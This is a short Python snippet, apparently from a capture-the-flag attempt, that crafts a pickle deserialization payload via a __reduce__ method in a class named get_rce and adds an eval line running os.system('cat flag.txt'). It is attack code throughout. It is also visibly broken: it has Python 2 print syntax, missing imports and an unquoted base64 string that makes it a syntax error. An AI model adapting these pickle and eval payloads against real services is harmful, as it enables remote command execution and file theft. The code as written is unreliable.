class get_rce(object):
    def __reduce__(self):
        return (input,("",))


if __name__ == '__main__':
    pickled = pickle.dumps(get_rce())
    print base64.b64encode(pickled),len(base64.b64encode(pickled)) == Y19fYnVpbHRpbl9fCmlucHV0CnAwCihTJycKcDEKdHAyClJwMwou
    
payload2 = eval('__import__("os").system("cat flag.txt")')
